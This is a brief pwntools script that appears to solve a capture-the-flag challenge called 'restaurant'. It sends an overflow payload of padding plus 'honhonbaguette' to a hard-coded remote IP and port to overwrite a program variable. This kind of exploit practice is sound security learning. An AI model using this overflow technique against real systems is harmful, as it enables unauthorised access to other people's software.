from pwn import *

elf = context.binary = ELF('./restaurant')
context.log_level = 'debug'

offset = 48 - 0x10

payload = offset * b'A' + b'honhonbaguette'

p = remote('34.87.173.177', 21003)
# p = process()

p.sendlineafter('>>', payload)

print(p.recvall().decode())
